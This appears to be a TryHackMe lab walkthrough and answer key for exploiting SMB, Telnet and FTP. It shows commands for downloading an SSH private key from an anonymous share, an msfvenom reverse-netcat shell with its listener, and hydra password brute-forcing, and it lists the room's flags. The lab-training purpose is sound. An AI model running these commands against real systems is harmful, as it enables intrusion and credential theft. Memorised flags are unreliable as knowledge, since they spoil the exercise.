# Network Services - TryHackMe 

Learn about, then enumerate and exploit a variety of network services and misconfigurations.

## Overview
- **Room URL:** [https://tryhackme.com/room/networkservices](https://tryhackme.com/room/networkservices)
- **Difficulty:** Easy
- **Time to complete:** 60

## Walkthrough
### 1. Get Connected
*No hints needed!*

### 2. Understanding SMB
- <p>What does SMB stand for?    <br /></p>

**=> Answer: `Server Message Block`**

- <p>What type of protocol is SMB?    <br /></p>

**=> Answer: `response-request`**

- <p>What protocol suite do clients use to connect to the server?    <br /></p>

**=> Answer: `TCP/IP`**

- <p>What systems does Samba run on?<br /></p>

**=> Answer: `Unix`**

### 3. Enumerating SMB
- Conduct an <b>nmap</b> scan of your choosing, How many ports are open?<br />
```bash
nmap -sV <MACHINE_IP>
```
![Guide image](./screenshots/network-services-1.png)
**=> Answer: `3`**

- <p>What ports is <strong>SMB</strong> running on? Provide the ports in ascending order.</p>

**=> Answer: `139/445`**

- <p>Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the <b>workgroup </b>name?    <br /></p>
```
enum4linux -a <MACHINE_IP
```
![Guide image](./screenshots/network-services-2.png)
**=> Answer: `WORKGROUP`**

- <p>What comes up as the <b>name</b> of the machine?        <br /></p>
![Guide image](./screenshots/network-services-3.png)
**=> Answer: `POLOSMB`**

- <p>What operating system <b>version</b> is running?    <br /></p>

**=> Answer: `6.1`**

- <p>What share sticks out as something we might want to investigate?    <br /></p>
![Guide image](./screenshots/network-services-4.png)
**=> Answer: `profiles`**

### 4. Exploiting SMB
- What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?<br />

**=> Answer: `smbclient //10.10.10.2/secret -U suit -p 445`**

- <p>Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:</p>
<p>- using the username "Anonymous"</p>
<p>- connecting to the share we found during the enumeration stage</p>
<p>- and not supplying a password.</p>
<p>Does the share allow anonymous access? Y/N?</p>

```bash
smbclient //<MACHINE_IP>/profiles -U Anonymous -p 445
```

![Guide Image](./screenshots/network-services-5.png)

**=> Answer: `Y`**

- Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to? <br />
```bash
smb: \> more "Working From Home Information.txt"
```

![Guide image](./screenshots/network-services-6.png)
**=> Answer: `John Cactus`**

- <p>What service has been configured to allow him to work from home?<br /></p>

**=> Answer: `ssh`**

- <p>Okay! Now we know this, what directory on the share should we look in?<br /></p>

**=> Answer: `.ssh`**

- <p>This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?<br /></p>

**=> Answer: `id_rsa`**

- <p>Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]". </p><p>Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.</p><p>What is the smb.txt flag?<br /></p>
```bash
smb: \> cd .ssh
smb: \> get id_rsa
```
```
- get will download id_rsa to your local machine.
```
```bash
chmod 600 ./id_rsa

ssh -i ./id_rsa cactus@<MACHINE_IP>

ls
cat smb.txt
```
**=> Answer: `THM{smb_is_fun_eh?}`**

### 5. Understanding Telnet
- <p>Is Telnet a client-server protocol (Y/N)?</p>

**=> Answer: `Y`**

- <p>What has slowly replaced Telnet?    <br /></p>

**=> Answer: `SSH`**

- How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?<br />

**=> Answer: `telnet 10.10.10.3 23`**

- The lack of what, means that all Telnet communication is in plaintext?<br />

**=> Answer: `encryption`**

### 6. Enumerating Telnet
- <p>How many <strong>ports</strong> are open on the target machine?<br />Note: you may need to scan non-standard ports too.</p>
```bash
nmap -sS -p- -Pn <MACHINE_IP>
```
*Note: The command will take a few minutes.*
![Guide image](./screenshots/network-services-7.png)

**=> Answer: `1`**

- <p>What <b>port</b> is this?<br /></p>

**=> Answer: `8012`**

- <p>This port is unassigned, but still lists the <b>protocol</b> it's using, what protocol is this?      <br /></p>

**=> Answer: `TCP`**

- <p>Now re-run the <b>nmap</b> scan, without the <b>-p-</b> tag, how many ports show up as open?<br /></p>
```bash
nmap <MACHINE_IP>
```
![Guide image](./screenshots/network-services-8.png)
**=> Answer: `0`**

- Based on the title returned to us, what do we think this port could be <b>used for</b>?<br />

**=> Answer: `a backdoor`**

- Who could it belong to? Gathering possible <b>usernames</b> is an important step in enumeration.<br />

**=> Answer: `Skidy`**

### 7. Exploiting Telnet
- <p>Great! It's an open telnet connection! What welcome message do we receive? <br /></p>
```bash
telnet <MACHINE_IP> 8012
```
![Guide image](./screenshots/network-services-9.png)
**=> Answer: `SKIDY'S BACKDOOR.`**

- <p>Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)<br /></p>

**=> Answer: `N`**

- <p>Start a tcpdump listener on your local machine.</p><p><b>If using your own machine with the OpenVPN connection, use:</b><br /></p><ul><li><code>sudo tcpdump ip proto \\icmp -i tun0</code></li></ul><p><b>If using the AttackBox, use:</b></p><ul><li><code>sudo tcpdump ip proto \\icmp -i ens5</code></li></ul><p>This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.<br /></p>

- <p>Now, use the command <b>"ping [local THM ip] -c 1" </b>through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)<br /></p>
```bash
.RUN ping <local THM ip> -c 1
```
![Guide image](./screenshots/network-services-10.png)
**=> Answer: `Y`**

- <p>We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:<br /></p><div style="font-size:14px;line-height:17px;-moz-tab-size:4;-o-tab-size:4;-webkit-tab-size:4;tab-size:4"><div><b><span>"msfvenom</span><span> </span><span>-</span><span>p</span><span> </span><span>cmd</span><span>/</span><span>unix</span><span>/</span><span>reverse_netcat </span><span>lhost</span><span>=[local tun0 ip]</span><span></span><span> </span><span>lport</span><span>=</span><span>4444</span><span> </span><span>R"</span></b></div><div><b><span><br /></span></b></div><div><span>-p = payload</span></div><div>lhost = our local host IP address (this is <b>your</b> machine's IP address)</div><div>lport = the port to listen on (this is the port on <b>your </b>machine)</div><div><span>R = export the payload in raw format<br /></span></div><div><span><br /></span></div><div><span>What word does the generated payload start with?<br /></span><b><span></span></b></div><div><span><br /></span></div></div>
![Guide image](./screenshots/network-services-11.png)
**=> Answer: `mkfifo`**

- <p>Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:</p><p><b>"nc -lvnp [listening port]" </b></p><p>What would the command look like for the listening port we selected in our payload?<br /><b></b><br /></p>

**=> Answer: `nc -lvnp 4444`**

- <p>Success! What is the contents of flag.txt?<br /></p>
```
.RUN mkfifo...
```
```
cat flag.txt
```
![Guide image](./screenshots/network-services-12.png)
![Guide image](./screenshots/network-services-13.png)
**=> Answer: `THM{y0u_g0t_th3_t3ln3t_fl4g}`**

### 8. Understanding FTP
- <p>What communications model does FTP use?<br /></p>

**=> Answer: `client-server`**

- <p>What's the standard FTP port?<br /></p>

**=> Answer: `21`**

- <p>How many modes of FTP connection are there?    <br /></p>

**=> Answer: `2`**

### 9. Enumerating FTP
- <p>Run an <b>nmap</b> scan of your choice.</p><p>How many <b>ports</b> are open on the target machine?  <br /></p>
```bash
nmap -sS -sV 10.10.43.253
```
![Guide image](./screenshots/network-services-14.png)
**=> Answer: `3`**

- <p>What <b>port</b> is ftp running on?<br /></p>

**=> Answer: `21`**

- <p>What <b>variant </b>of FTP is running on it?   </p>

**=> Answer: `vsftpd`**

- <p>Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "<i>ftp [IP]</i>" into the console, and entering "anonymous", and no password when prompted.</p><p>What is the name of the file in the anonymous FTP directory?<br /></p><p><br /></p>
```bash
ftp <MACHINE_IP>
ls
```
![Guide image](./screenshots/network-services-15.png)
**=> Answer: `PUBLIC_NOTICE.txt`**

- What do we think a possible username <br />could be?<br />
```bash
more PUBLIC_NOTICE.txt
```
![Guide image](./screenshots/network-services-16.png)
**=> Answer: `mike`**

### 10. Exploiting FTP
- <p>What is the password for the user "mike"?<br /></p>
```bash
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <MACHINE_IP> ftp
```
![Guide image](./screenshots/network-services-17.png)
**=> Answer: `password`**

- <p>What is ftp.txt?<br /></p>
```bash
ftp <MACHINE_IP>
Username: mike
Password: password

more ftp.txt
```
![Guide image](./screenshots/network-services-18.png)
**=> Answer: `THM{y0u_g0t_th3_ftp_fl4g}`**

### 11. Expanding Your Knowledge 
*No hints needed!*

